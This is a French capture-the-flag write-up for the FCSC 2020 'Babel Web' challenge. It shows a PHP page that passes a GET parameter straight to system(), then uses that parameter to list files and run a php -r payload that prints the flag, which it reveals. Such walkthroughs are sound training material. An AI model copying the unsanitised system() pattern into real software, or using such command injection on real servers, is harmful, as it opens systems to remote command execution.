**Babel Web - Writeup FCSC 2020**

Très bien, commencons ce challenge par le début.

On commence avec un énoncé
```

On vous demande d’auditer ce site en cours de construction à la recherche d’un flag.

```

et deux hints.

On se connecte par la suite à l'URL du challenge (http://challenges2.france-cybersecurity-challenge.fr:5001/) et on tombe sur une très belle page d'accueil avec un style très rafinné x)

Très bien, passons aux choses sérieuses.

Observons le code source de la page:

```


<html>
	<head>
		<title>Bienvenue à Babel Web!</title>
	</head>	
	<body>
		<h1>Bienvenue à Babel Web!</h1>
		La page est en cours de développement, merci de revenir plus tard.
		<!-- <a href="?source=1">source</a> -->
	</body>
</html>



```


On y voit déjà un petit commentaire dont le contenu est une balise `<a>` dont le lien retourne vers http://challenges2.france-cybersecurity-challenge.fr:5001/?source=1 .

Allons donc voir ça de plus près: 

```

<?php
    if (isset($_GET['source'])) {
        @show_source(__FILE__);
    }  else if(isset($_GET['code'])) {
        print("<pre>");
        @system($_GET['code']);
        print("<pre>");
    } else {
?>
<html>
    <head>
        <title>Bienvenue à Babel Web!</title>
    </head>    
    <body>
        <h1>Bienvenue à Babel Web!</h1>
        La page est en cours de développement, merci de revenir plus tard.
        <!-- <a href="?source=1">source</a> -->
    </body>
</html>
<?php
    }
?>

```

Et voici donc le code source de l'index,

on y comprend vite une chose en regardant le code source : Qu'on va pouvoir executer des commandes à partir du paramètre ?code

Ajoutons-donc le paramètre ?code à l'URL de départ et essayons de lister les fichiers dans le répertoire courrant: http://challenges2.france-cybersecurity-challenge.fr:5001/?code=ls


<img src="https://img.onii.wtf/i/p0sk6.png">

On se retrouve donc bien avec les fichiers listés.

Essayons simplement de cat flag.php

<img src="https://img.onii.wtf/i/kq1z8.png">

Rien n'est retourné, essayons autrement, en incluant le fichier flag.php par exemple

Je vais utiliser le payload suivant pour afficher le flag:
```

php -r 'include "flag.php"; echo $flag;'

```

Je l'entre donc dans le paramètre ?code= 

Et que voici ? 

<img src="https://img.onii.wtf/i/xgcmi.png">


Le flag était donc : *FCSC{5d969396bb5592634b31d4f0846d945e4befbb8c470b055ef35c0ac090b9b8b7}*

